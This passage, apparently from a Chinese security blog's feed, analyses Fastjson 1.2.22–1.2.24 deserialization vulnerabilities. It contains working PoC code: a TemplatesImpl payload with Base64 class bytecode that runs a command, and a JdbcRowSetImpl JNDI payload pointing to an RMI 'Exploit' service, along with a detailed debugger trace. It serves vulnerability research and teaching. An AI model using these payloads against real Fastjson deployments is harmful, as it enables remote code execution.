class="line">parse:1322, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:152, JSON (com.alibaba.fastjson)</span><br><span class="line">parse:162, JSON (com.alibaba.fastjson)</span><br><span class="line">parse:131, JSON (com.alibaba.fastjson)</span><br><span class="line">main:8, JdbcRowSetImplPoc</span><br></pre></td></tr></table></figure><hr><p>OK，Fastjson历史版本补丁的绕过大致就这些，并且这些都是需要开启AutoTypeSupport才能成功利用的，后面一篇文章就是讲2019年Fastjson反序列化漏洞，一样是checkAutoType()的绕过，但是无需开启AutoTypeSupport。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Fastjson系列二——1.2.22-1.2.24反序列化漏洞</title>
    <link href="https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.mi1k7ea.com/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/</id>
    <published>2019-11-07T13:20:04.000Z</published>
    <updated>2019-11-16T10:04:11.454Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h2><p>Fastjson 1.2.x系列的1.2.22-1.2.24版本。</p><h2 id="0x02-复现"><a href="#0x02-复现" class="headerlink" title="0x02 复现"></a>0x02 复现</h2><p>对于Fastjson 1.2.22-1.2.24 版本的反序列化漏洞的利用，目前已知的主要有以下的利用链：</p><ul><li>基于TemplateImpl；</li><li>基于JNDI（又分为基于Bean Property类型和Field类型）；</li></ul><h3 id="需要的jar包"><a href="#需要的jar包" class="headerlink" title="需要的jar包"></a>需要的jar包</h3><p>我本地用的是fastjson-1.2.24.jar，commons-codec-1.12.jar，commons-io-2.5.jar，另外基于JdbcRowSetImpl调用链的利用还需要unboundid-ldapsdk-4.0.9.jar。</p><h3 id="基于TemplateImpl的利用链"><a href="#基于TemplateImpl的利用链" class="headerlink" title="基于TemplateImpl的利用链"></a>基于TemplateImpl的利用链</h3><p>这部分代码参考的<a href="http://xxlegend.com/2017/05/03/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">廖新喜大佬的博客</a>。</p><h4 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h4><p>需要设置Feature.SupportNonPublicField进行反序列化操作才能成功触发利用。</p><h4 id="复现利用"><a href="#复现利用" class="headerlink" title="复现利用"></a>复现利用</h4><p>恶意类Test.java，用于弹计算器，至于为啥需要继承AbstractTranslet类在后面的调试分析中会具体看到：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Test</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Test t = <span class="keyword">new</span> Test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PoC.java，Fastjson反序列化漏洞点，Feature.SupportNonPublicField必须设置，readClass()方法用于将恶意类的二进制数据进行Base64编码，至于为何要进行编码在后面会讲到：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PoC</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">readClass</span><span class="params">(String cls)</span></span>&#123;</span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            IOUtils.copy(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(cls)), bos);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Base64.encodeBase64String(bos.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">            <span class="keyword">final</span> String fileSeparator = System.getProperty(<span class="string">"file.separator"</span>);</span><br><span class="line">            <span class="keyword">final</span> String evilClassPath = System.getProperty(<span class="string">"user.dir"</span>) + <span class="string">"\\out\\production\\FJTest\\Test.class"</span>;</span><br><span class="line">            String evilCode = readClass(evilClassPath);</span><br><span class="line">            <span class="keyword">final</span> String NASTY_CLASS = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>;</span><br><span class="line">            String text1 = <span class="string">"&#123;\"@type\":\""</span> + NASTY_CLASS +</span><br><span class="line">                    <span class="string">"\",\"_bytecodes\":[\""</span>+evilCode+<span class="string">"\"],'_name':'a.b','_tfactory':&#123; &#125;,\"_outputProperties\":&#123; &#125;,"</span> +</span><br><span class="line">                    <span class="string">"\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"&#125;\n"</span>;</span><br><span class="line">            System.out.println(text1);</span><br><span class="line"></span><br><span class="line">            Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">            <span class="comment">//Object obj = JSON.parse(text1, Feature.SupportNonPublicField);</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即可弹出计算器：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/1.png" alt=""></p><p>关键看输出的构造的PoC：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADMANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZMVGVzdDsBAApFeGNlcHRpb25zBwAsAQAJdHJhbnNmb3JtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAtAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAXQHAC4BAApTb3VyY2VGaWxlAQAJVGVzdC5qYXZhDAAIAAkHAC8MADAAMQEABGNhbGMMADIAMwEABFRlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgALAAAADgADAAAACgAEAAsADQAMAAwAAAAMAAEAAAAOAA0ADgAAAA8AAAAEAAEAEAABABEAEgABAAoAAABJAAAABAAAAAGxAAAAAgALAAAABgABAAAADwAMAAAAKgAEAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABUAFgACAAAAAQAXABgAAwABABEAGQACAAoAAAA/AAAAAwAAAAGxAAAAAgALAAAABgABAAAAEgAMAAAAIAADAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABoAGwACAA8AAAAEAAEAHAAJAB0AHgACAAoAAABBAAIAAgAAAAm7AAVZtwAGTLEAAAACAAsAAAAKAAIAAAAUAAgAFQAMAAAAFgACAAAACQAfACAAAAAIAAEAIQAOAAEADwAAAAQAAQAiAAEAIwAAAAIAJA=="],'_name':'a.b','_tfactory':&#123; &#125;,"_outputProperties":&#123; &#125;,"_name":"a","_version":"1.0","allowedProtocols":"all"&#125;</span><br></pre></td></tr></table></figure><p>PoC中几个重要的Json键的含义：</p><ul><li><strong>@type</strong>——指定的解析类，即<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>，Fastjson根据指定类去反序列化得到该类的实例，在默认情况下只会去反序列化public修饰的属性，在PoC中，<code>_bytecodes</code>和<code>_name</code>都是私有属性，所以想要反序列化这两个属性，需要在<code>parseObject()</code>时设置<code>Feature.SupportNonPublicField</code>；</li><li><strong>_bytecodes</strong>——是我们把恶意类的.class文件二进制格式进行Base64编码后得到的字符串；</li><li><strong>_outputProperties</strong>——漏洞利用链的关键会调用其参数的getOutputProperties()方法，进而导致命令执行；</li><li><strong>_tfactory:{}</strong>——在defineTransletClasses()时会调用getExternalExtensionsMap()，当为null时会报错，所以要对_tfactory设置；</li></ul><h4 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h4><p>下面我们直接在反序列化的那句代码上打上断点进行调试分析：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);</span><br></pre></td></tr></table></figure><p>在JSON.parseObject()中会调用DefaultJSONParser.parseObject()，而DefaultJSONParser.parseObject()中调用了JavaObjectDeserializer.deserialze()函数进行反序列化：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/2.png" alt=""></p><p>跟进该函数，发现会返回去调用DefaultJSONParser.parse()函数：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/3.png" alt=""></p><p>继续调试，在DefaultJSONParser.parse()里是对JSON内容进行扫描，在switch语句中匹配上了”{“即对应12，然后对JSON数据调用DefaultJSONParser.parseObject()进行解析：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/4.png" alt=""></p><p>在DefaultJSONParser.parseObject()中，通过for语句循环解析JSON数据内容，其中skipWhitespace()函数用于去除数据中的空格字符，然后获取当前字符是否为双引号，是的话就调用scanSymbol()获取双引号内的内容，这里得到第一个双引号里的内容为”@type”：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/5.png" alt=""></p><p>往下调试，判断key是否为@type且是否关闭了Feature.DisableSpecialKeyDetect设置，通过判断后调用scanSymbol()获取到了@type对应的指定类<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>，并调用TypeUtils.loadClass()函数加载该类：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/6.png" alt=""></p><p>跟进去，看到如红框的两个判断语句代码逻辑，是判断当前类名是否以”[“开头或以”L”开头以”;”结尾，当然本次调试分析是不会进入到这两个逻辑，但是后面的补丁绕过中利用到了这两个条件判断，也就是说<strong>这两个判断条件是后面补丁绕过的漏洞点</strong>，值得注意：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/8.png" alt=""></p><p>往下看，通过ClassLoader.loadClass()加载到目标类后，然后将该类名和类缓存到Map中，最后返回该加载的类：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/7.png" alt=""></p><p>返回后，程序继续回到DefaultJSONParser.parseObject()中往下执行，在最后调用JavaBeanDeserializer.deserialze()对目标类进行反序列化：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/9.png" alt=""></p><p>跟进去，循环扫描解析，解析到key为<code>_bytecodes</code>时，调用parseField()进一步解析：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/10.png" alt=""></p><p>在parseField()中，会调用DefaultFieldDeserializer.parseField()对<code>_bytecodes</code>对应的内容进行解析：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/11.png" alt=""></p><p>跟进DefaultFieldDeserializer.parseField()函数中，解析出<code>_bytecodes</code>对应的内容后，会调用setValue()函数设置对应的值，这里value即为恶意类二进制内容Base64编码后的数据：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/12.png" alt=""></p><p>FieldDeserializer.setValue()函数，看到是调用<code>private byte[][] com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl._bytecodes</code>的set方法来设置<code>_bytecodes</code>的值：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/13.png" alt=""></p><p>返回之后，后面也是一样的，循环处理JSON数据中的其他键值内容。</p><p>当解析到<code>_outputProperties</code>的内容时，看到前面的下划线被去掉了：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/14.png" alt=""></p><p>跟进该方法，发现会通过反射机制调用<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()</code>方法，可以看到该方法类型是Properties、满足之前我们得到的结论即Fastjson反序列化会调用被反序列化的类的某些满足条件的getter方法：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/15.png" alt=""></p><p>跟进去，在getOutputProperties()方法中调用了newTransformer().getOutputProperties()方法：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/16.png" alt=""></p><p>跟进TemplatesImpl.newTransformer()方法，看到调用了getTransletInstance()方法：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/17.png" alt=""></p><p>继续跟进去查看getTransletInstance()方法，可以看到已经解析到Test类并新建一个Test类实例，注意前面会先调用defineTransletClasses()方法来生成一个Java类（Test类）：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/18.png" alt=""></p><p>再往下就是新建Test类实例的过程，并调用Test类的构造函数：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/19.png" alt=""></p><p>再之后就是弹计算器了。</p><p><strong>整个调试过程主要的函数调用栈如下：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;init&gt;:11, Test</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:57, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:526, Constructor (java.lang.reflect)</span><br><span class="line">newInstance:383, Class (java.lang)</span><br><span class="line">getTransletInstance:408, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:439, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getOutputProperties:460, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:57, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:606, Method (java.lang.reflect)</span><br><span class="line">setValue:85, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">deserialze:45, JavaObjectDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseObject:639, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parseObject:339, JSON (com.alibaba.fastjson)</span><br><span class="line">parseObject:302, JSON (com.alibaba.fastjson)</span><br><span class="line">main:35, PoC</span><br></pre></td></tr></table></figure><p>最后的调用过滤再具体说下：在getTransletInstance()函数中调用了defineTransletClasses()函数，在defineTransletClasses()函数中会根据_bytecodes来生成一个Java类（这里为恶意类Test），其构造方法中含有命令执行代码，生成的Java类随后会被newInstance()方法调用生成一个实例对象，从而该类的构造函数被自动调用，进而造成任意代码执行。</p><h4 id="为什么恶意类需要继承AbstractTranslet类"><a href="#为什么恶意类需要继承AbstractTranslet类" class="headerlink" title="为什么恶意类需要继承AbstractTranslet类"></a>为什么恶意类需要继承AbstractTranslet类</h4><p>在前面的调试分析中，getTransletInstance()函数会先调用defineTransletClasses()方法来生成一个Java类，我们跟进这个defineTransletClasses()方法查看下：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/35.png" alt=""></p><p>可以看到有个逻辑会判断恶意类的父类类名是否是<code>ABSTRACT_TRANSLET</code>，是的话<code>_transletIndex</code>变量的值被设置为0，到后面的if判断语句中就不会被识别为&lt;0而抛出异常终止程序。</p><h4 id="为什么需要对-bytecodes进行Base64编码"><a href="#为什么需要对-bytecodes进行Base64编码" class="headerlink" title="为什么需要对_bytecodes进行Base64编码"></a>为什么需要对_bytecodes进行Base64编码</h4><p>可以发现，在PoC中的<code>_bytecodes</code>字段是经过Base64编码的。为什么要怎么做呢？分析Fastjson对JSON字符串的解析过程，原理Fastjson提取byte[]数组字段值时会进行Base64解码，所以我们构造payload时需要对<code>_bytecodes</code>字段进行Base64加密处理。</p><p>其中Fastjson的处理代码如下，在ObjectArrayCodec.deserialze()函数中会调用lexer.bytesValue()对byte数组进行处理：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">deserialze</span><span class="params">(DefaultJSONParser parser, Type type, Object fieldName)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> JSONLexer lexer = parser.lexer;</span><br><span class="line">    <span class="keyword">if</span> (lexer.token() == JSONToken.NULL) &#123;</span><br><span class="line">        lexer.nextToken(JSONToken.COMMA);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = lexer.bytesValue();</span><br><span class="line">        lexer.nextToken(JSONToken.COMMA);</span><br><span class="line">        <span class="keyword">return</span> (T) bytes;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们调试看看ObjectArrayCodec.deserialze()函数是在哪调用的，其实它的调用实在setValue()前面进行处理的：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/20.png" alt=""></p><p>跟进几层，看到调用栈就清楚了，实在ObjectArrayCodec.deserialze()函数中调用到的：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/21.png" alt=""></p><p>跟进bytesValue()函数，就是对<code>_bytecodes</code>的内容进行Base64解码：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/22.png" alt=""></p><h4 id="为什么需要设置-tfactory为"><a href="#为什么需要设置-tfactory为" class="headerlink" title="为什么需要设置_tfactory为{}"></a>为什么需要设置_tfactory为{}</h4><p>由前面的调试分析知道，在getTransletInstance()函数中调用了defineTransletClasses()函数，defineTransletClasses()函数是用于生成Java类的，在其中会新建一个转换类加载器，其中会调用到<code>_tfactory.getExternalExtensionsMap()</code>方法，若<code>_tfactory</code>为null则会导致这段代码报错、从而无法生成恶意类，进而无法成功攻击利用：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/24.png" alt=""></p><h4 id="为什么反序列化调用getter方法时会调用到TemplatesImpl-getOutputProperties-方法"><a href="#为什么反序列化调用getter方法时会调用到TemplatesImpl-getOutputProperties-方法" class="headerlink" title="为什么反序列化调用getter方法时会调用到TemplatesImpl.getOutputProperties()方法"></a>为什么反序列化调用getter方法时会调用到TemplatesImpl.getOutputProperties()方法</h4><p>getOutputProperties()方法是个无参数的非静态的getter方法，以get开头且第四个字母为大写形式，其返回值类型是Properties即继承自Map类型，满足之前文章<a href="https://www.mi1k7ea.com/2019/11/03/Fastjson%E7%B3%BB%E5%88%97%E4%B8%80%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/#%E5%B0%8F%E7%BB%93">《Fastjson系列一——反序列化漏洞基本原理》</a>说的Fastjson反序列化时会调用的getter方法的条件，因此在使用Fastjson对TemplatesImpl类对象进行反序列化操作时会自动调用getOutputProperties()方法。</p><h4 id="如何关联-outputProperties与getOutputProperties-方法"><a href="#如何关联-outputProperties与getOutputProperties-方法" class="headerlink" title="如何关联_outputProperties与getOutputProperties()方法"></a>如何关联_outputProperties与getOutputProperties()方法</h4><p>Fastjson会语义分析JSON字符串，根据字段key，调用fieldList数组中存储的相应方法进行变量初始化赋值。</p><p>具体的代码在JavaBeanDeserializer.parseField()中，其中调用了smartMatch()方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">parseField</span><span class="params">(DefaultJSONParser parser, String key, Object object, Type objectType, Map&lt;String, Object&gt; fieldValues)</span> </span>&#123;</span><br><span class="line">        JSONLexer lexer = parser.lexer; <span class="comment">// xxx</span></span><br><span class="line"></span><br><span class="line">        FieldDeserializer fieldDeserializer = smartMatch(key);</span><br></pre></td></tr></table></figure><p>在JavaBeanDeserializer.smartMatch()方法中，会替换掉字段key中的<code>_</code>，从而使得<code>_outputProperties</code>变成了outputProperties：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/23.png" alt=""></p><p>既然已经得到了outputProperties属性了，那么自然而然就会调用到getOutputProperties()方法了。</p><h3 id="基于JdbcRowSetImpl的利用链"><a href="#基于JdbcRowSetImpl的利用链" class="headerlink" title="基于JdbcRowSetImpl的利用链"></a>基于JdbcRowSetImpl的利用链</h3><p>基于JdbcRowSetImpl的利用链主要有两种利用方式，即JNDI+RMI和JNDI+LDAP，都是属于基于Bean Property类型的JNDI的利用方式。</p><p>关于JNDI注入的相关概念，可以参考之前的文章<a href="https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/">《浅析JNDI注入》</a>。</p><h4 id="限制-1"><a href="#限制-1" class="headerlink" title="限制"></a>限制</h4><p>由于是利用JNDI注入漏洞来触发的，因此主要的限制因素是JDK版本。</p><p>基于RMI利用的JDK版本&lt;=6u141、7u131、8u121，基于LDAP利用的JDK版本&lt;=6u211、7u201、8u191。</p><h4 id="JNDI-RMI复现利用"><a href="#JNDI-RMI复现利用" class="headerlink" title="JNDI+RMI复现利用"></a>JNDI+RMI复现利用</h4><p>PoC如下，@type指向com.sun.rowset.JdbcRowSetImpl类，dataSourceName值为RMI服务中心绑定的Exploit服务，autoCommit有且必须为true或false等布尔值类型：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="string">"dataSourceName"</span>:<span class="string">"rmi://localhost:1099/Exploit"</span>, <span class="string">"autoCommit"</span>:<span class="keyword">true</span>&#125;</span><br></pre></td></tr></table></figure><p>JNDIServer.java，RMI服务，注册表绑定了Exploit服务，该服务是指向恶意Exploit.class文件所在服务器的Reference：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span 